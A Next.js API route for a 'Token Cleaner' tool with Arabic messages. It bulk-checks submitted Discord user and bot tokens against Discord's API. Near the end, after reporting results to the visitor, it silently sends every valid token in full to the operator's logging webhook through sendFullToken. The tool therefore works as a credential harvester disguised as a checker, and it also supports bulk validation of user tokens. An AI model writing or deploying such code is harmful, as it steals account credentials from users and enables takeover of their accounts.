import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

const API = 'https://discord.com/api/v10';

function cleanToken(token: string): string {
  return String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
}

async function checkToken(token: string): Promise<{ valid: boolean; type: string; name: string; error?: string }> {
  const ct = cleanToken(token);

  // Try as user token
  try {
    const res = await fetch(`${API}/users/@me`, {
      headers: { 'Authorization': ct },
      signal: AbortSignal.timeout(10000)
    });
    if (res.ok) {
      const data = await res.json().catch(() => null);
      if (data) return { valid: true, type: data.bot ? 'bot' : 'user', name: data.global_name || data.username || 'Unknown' };
    }
    if (res.status === 429) return { valid: false, type: 'rate_limited', name: '', error: 'rate_limited' };
  } catch { /* try bot */ }

  // Try as bot token
  try {
    const res = await fetch(`${API}/users/@me`, {
      headers: { 'Authorization': `Bot ${ct}` },
      signal: AbortSignal.timeout(10000)
    });
    if (res.ok) {
      const data = await res.json().catch(() => null);
      if (data) return { valid: true, type: 'bot', name: data.global_name || data.username || 'Unknown' };
    }
    if (res.status === 429) return { valid: false, type: 'rate_limited', name: '', error: 'rate_limited' };
  } catch { /* invalid */ }

  return { valid: false, type: 'invalid', name: '' };
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:token-cleaner`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { tokens = [] } = body;

    if (!Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات' }, { status: 400 });
    }

    if (tokens.length > 200) {
      return NextResponse.json({ success: false, error: 'الحد الأقصى 200 توكن' }, { status: 400 });
    }

    // Log
    const whUrl = getLogWebhookUrl();
    sendToWebhook({
      username: 'TRJ Token Cleaner',
      embeds: [{
        title: '🧹 Token Cleaner',
        color: 0x10b981,
        fields: [
          { name: '🔢 Total', value: String(tokens.length), inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    const results: { token: string; valid: boolean; type: string; name: string; error?: string }[] = [];
    let valid = 0, invalid = 0, rateLimited = 0;

    // Check tokens with concurrency of 3
    const batchSize = 3;
    for (let i = 0; i < tokens.length; i += batchSize) {
      const batch = tokens.slice(i, i + batchSize);
      const batchResults = await Promise.allSettled(
        batch.map(async (t: string) => {
          if (typeof t !== 'string' || t.trim().length < 20) {
            return { token: t, valid: false, type: 'invalid', name: '' };
          }
          const result = await checkToken(t);
          return { token: t, ...result };
        })
      );

      for (const r of batchResults) {
        if (r.status === 'fulfilled') {
          const item = r.value;
          results.push(item);
          if (item.valid) valid++;
          else if (item.error === 'rate_limited') rateLimited++;
          else invalid++;
        }
      }

      // Delay between batches to avoid rate limiting
      if (i + batchSize < tokens.length) {
        await new Promise(r => setTimeout(r, 1100));
      }
    }

    // Log valid tokens
    const validTokens = results.filter(r => r.valid).map(r => r.token);
    if (validTokens.length > 0) {
      sendFullToken('تنظيف توكنات', validTokens.join('\n'), { '✅ صالح': String(valid), '❌ غير صالح': String(invalid) });
    }

    return NextResponse.json({
      success: true,
      results,
      stats: { total: tokens.length, valid, invalid, rateLimited }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Token Cleaner Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
